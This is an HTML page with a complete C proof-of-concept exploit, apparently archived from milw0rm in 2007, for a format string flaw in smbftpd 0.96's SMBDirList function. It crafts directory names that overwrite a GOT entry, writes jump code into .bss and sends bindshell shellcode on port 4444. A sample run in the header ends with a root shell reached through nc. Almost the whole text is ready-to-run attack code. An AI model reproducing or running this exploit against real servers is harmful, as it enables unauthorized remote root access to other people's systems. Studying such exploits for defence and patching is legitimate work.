<html><head><title>smbftpd 0.96 SMBDirList-function Remote Format String Exploit</title></head><pre>/*
 * smbftpd 0.96 Proof of concept
 * tested with smbftpd 0.96 compiled with gcc 3.3.6
 *
 * 1. write jumpcode to `BSS`
 *      mov dx, 0x1234
 *      pop eax
 *      cmp ax, dx
 *      jne $-4
 *      jmp esp
 * 2. overwrite a GOT entry with the addr to `BSS` &amp; send shellcode
 *
 *  jerry:~&gt; ./bleh -h localhost
 *  [+] GOT: 0x80591d8 - .bss (jmpcode): 0x805a791
 *  [+] localhost:21 (user: anonymous pass: )
 *  [+] PASV
 *  [+] writing jumpcode
 *  [+] PASV
 *  [+] overwriting GOT entry and sending shellcode
 *  jerry:~&gt; nc localhost 4444
 *  id
 *  uid=0(root) gid=0(root) euid=1002(ftp) egid=1002(ftp) groups=1002(ftp)
 *
 *
 *  - Jerry Illikainen &lt;jerry@debork.se&gt;
 *
 */

#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/socket.h&gt;
#include &lt;netinet/in.h&gt;
#include &lt;netdb.h&gt;
#include &lt;stdarg.h&gt;
#include &lt;unistd.h&gt;
#include &lt;stdlib.h&gt;

#define GOT 0x080591d8 // GOT entry for chdir
#define BSS 0x0805a791 // this is where the jumpcode will be written

#define DEBUG(d) if (debug) d;
#define MAXPATH 255
#define BUFSIZE 512

unsigned int debug = 0;

/* bindshell (port 4444) from metasploit.com
 * restricted chars = 0x00 0x0a 0x0d */
unsigned char shellcode[] =
	&quot;\x31\xc9\x83\xe9\xeb\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\xa3&quot;
	&quot;\xef\xd7\xdb\x83\xeb\xfc\xe2\xf4\x92\x34\x84\x98\xf0\x85\xd5\xb1&quot;
	&quot;\xc5\xb7\x4e\x52\x42\x22\x57\x4d\xe0\xbd\xb1\xb3\xb2\xb3\xb1\x88&quot;
	&quot;\x2a\x0e\xbd\xbd\xfb\xbf\x86\x8d\x2a\x0e\x1a\x5b\x13\x89\x06\x38&quot;
	&quot;\x6e\x6f\x85\x89\xf5\xac\x5e\x3a\x13\x89\x1a\x5b\x30\x85\xd5\x82&quot;
	&quot;\x13\xd0\x1a\x5b\xea\x96\x2e\x6b\xa8\xbd\xbf\xf4\x8c\x9c\xbf\xb3&quot;
	&quot;\x8c\x8d\xbe\xb5\x2a\x0c\x85\x88\x2a\x0e\x1a\x5b&quot;;


void usage (char *arg)
{
	printf(&quot;%s [options]\n&quot;
		   &quot;\t -h &lt;host&gt;\n&quot;
		   &quot;\t -p &lt;port&gt;\n&quot;
		   &quot;\t -u &lt;usernmae - default anonymous&gt;\n&quot;
		   &quot;\t -P &lt;password - default none&gt;\n\n&quot;, arg);
	exit(1);
}

int sock (int port, char *host)
{
	struct hostent *h;
	struct sockaddr_in addr;
	int s;

	if ((h = gethostbyname(host)) == NULL)
	{
		perror(&quot;[!] gethostbyname&quot;);
		exit(1);
	}
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == -1)
	{
		perror(&quot;[!] socket&quot;);
		exit(1);
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	addr.sin_addr = *((struct in_addr *)h-&gt;h_addr);
	memset(addr.sin_zero, '\0', sizeof addr.sin_zero);
	if (connect(s, (struct sockaddr *)&amp;addr, sizeof(struct sockaddr)) == -1)
	{
		perror(&quot;[!] connect&quot;);
		exit(1);
	}
	return s;
}

char *s_send (int s, char *m, char *fmt, ...)
{
	static char buf[BUFSIZE];
	char str[BUFSIZE];
	ssize_t nb;
	va_list ap;

	va_start(ap, fmt);
	vsnprintf(str, BUFSIZE-1, fmt, ap);
	va_end(ap);
	if (send(s, str, strlen(str), 0) == -1)
	{
		perror(&quot;[!] send&quot;);
		exit(1);
	}
	DEBUG(printf(&quot;send: %s\n&quot;, str));

	for (;;)
	{
		nb = recv(s, buf, BUFSIZE-1, 0);
		buf[nb-1] = '\0';
		if (m == NULL)
			return buf;
		else if (strstr(buf, m) != NULL)
			return buf;
	}
}

void fmt (int *jmpaddr, int *jmpc, int got, char mkd[][MAXPATH])
{
	unsigned char a[4], b[4];
	char *dir = mkd[0];
	unsigned int i, offset = 1052, start = 256, base = 4;
	int *pa = (int *)jmpaddr[0], *pb = (int *)jmpc[0];

	for (i = 0; i &lt;= 4; i++)
	{
		a[0] = (int)pa &gt;&gt; 24;
		a[1] = ((int)pa &amp; 0xff0000) &gt;&gt; 16;
		a[2] = ((int)pa &amp; 0xff00) &gt;&gt; 8;
		a[3] = (int)pa &amp; 0xff;

		b[0] = (int)pb &gt;&gt; 24;
		b[1] = ((int)pb &amp; 0xff0000) &gt;&gt; 16;
		b[2] = ((int)pb &amp; 0xff00) &gt;&gt; 8;
		b[3] = (int)pb &amp; 0xff;

		snprintf(dir, MAXPATH-1,
				&quot;%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c&quot;
				&quot;%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n&quot;,
				a[3], a[2], a[1], a[0],
				a[3] + 1, a[2], a[1], a[0],
				a[3] + 2, a[2], a[1], a[0],
				a[3] + 3, a[2], a[1], a[0],

				b[3] - 12 + start - (base + 4 - (base%4)), offset,
				b[2] - b[3] + start, offset + 1,
				b[1] - b[2] + start, offset + 2,
				b[0] - b[1] + start, offset + 3);
		
		dir = mkd[i];
		if (i &lt; 3)
		{
			pa = (int *)jmpaddr[i];
			pb = (int *)jmpc[i];
		} else {
			pa = (int *)got;
			pb = (int *)jmpaddr[0];
		}
	}
}

int main (int argc, char **argv)
{
	int s[2], c, port = 21, pasv[5];
	unsigned int i;
	char *host = NULL, *user = &quot;anonymous&quot;, *pass = &quot;&quot;, *tmp, *p;
	char mkd[5][MAXPATH], sc[2048];
	int 
		got = GOT,
		jmpaddr[] = { BSS, BSS+4, BSS+8 },
		jmpc[] = {
			0x1234ba66, // mov dx, 0x1234   - 66 ba 34 12
			0xc2396658, // pop eax          - 58
			0xe4fffa75  // cmp ax,dx        - 66 39 c2
                        // jne $-4          - 75 fa
                        // jmp esp          - ff e4
		};

	while ((c = getopt(argc, argv, &quot;h:p:u:P:?&quot;)) != -1)
	{
		switch (c)
		{
			case 'h':
				host = optarg;
				break;
			case 'p':
				port = atoi(optarg);
				break;
			case 'u':
				user = optarg;
				break;
			case 'P':
				pass = optarg;
				break;
			case '?':
			default:
				usage(argv[0]);
				break;
		}
	}
	if (host == NULL)
		usage(argv[0]);

	printf(&quot;[+] GOT: %p - .bss (jmpcode): %p\n&quot;, (void *)got, (void *)jmpaddr[0]);
	fmt(jmpaddr, jmpc, got, mkd);

	printf(&quot;[+] %s:%d (user: %s pass: %s)\n&quot;, host, port, user, pass);
	s[0] = sock(port, host);
	s_send(s[0], &quot;331&quot;, &quot;USER %s\n&quot;, user);
	p = s_send(s[0], NULL, &quot;PASS %s\n&quot;, pass);
	if (strstr(p, &quot;230&quot;) == NULL)
	{
		printf(&quot;[!] login failed\n&quot;);
		exit(1);
	}
	p = s_send(s[0], NULL, &quot;MKD %s\nMKD %s\nMKD %s\n&quot;, mkd[0], mkd[1], mkd[2]);
	if (strstr(p, &quot;257&quot;) == NULL)
	{
		printf(&quot;[!] couldn't make directories\n&quot;);
		exit(1);
	}

	printf(&quot;[+] PASV\n&quot;);
	p = s_send(s[0], &quot;227&quot;, &quot;PASV\n&quot;);
	if (strtok(p, &quot;,&quot;) == NULL)
		exit(1);
	for (i = 0; i &lt; 5; i++)
	{
		if ((tmp = strtok(NULL, &quot;,&quot;)) == NULL)
		{
			printf(&quot;[!] aborting\n&quot;);
			exit(1);
		}
		pasv[i] = atoi(tmp);
	}
	s[1] = sock(pasv[3]*256+pasv[4], host);

	printf(&quot;[+] writing jumpcode\n&quot;);
	s_send(s[0], NULL, &quot;NLST -R\n&quot;);
	s_send(s[0], NULL, &quot;RMD %s\nRMD %s\nRMD %s\n&quot;, mkd[0], mkd[1], mkd[2]);
	close(s[1]);

	s_send(s[0], NULL, &quot;MKD %s\n&quot;, mkd[3]);
	printf(&quot;[+] PASV\n&quot;);
	p = s_send(s[0], &quot;227&quot;, &quot;PASV\n&quot;);
	if (strtok(p, &quot;,&quot;) == NULL)
		exit(1);
	for (i = 0; i &lt; 5; i++)
	{
		if ((tmp = strtok(NULL, &quot;,&quot;)) == NULL)
		{
			printf(&quot;[!] aborting\n&quot;);
			exit(1);
		}
		pasv[i] = atoi(tmp);
	}
	s[1] = sock(pasv[3]*256+pasv[4], host);

	memset(sc, 0x90, sizeof(sc)); // some nops before and
	memcpy(sc+3, &quot;\x34\x12&quot;, 2); // after the &quot;mark&quot;
	memcpy(sc+12, shellcode, sizeof(sc)-12);
	printf(&quot;[+] overwriting GOT entry and sending shellcode\n\n&quot;);
	s_send(s[0], NULL, &quot;NLST -R%s\n&quot;, sc);
	return 0;
}

// milw0rm.com [2007-10-01]</pre></html>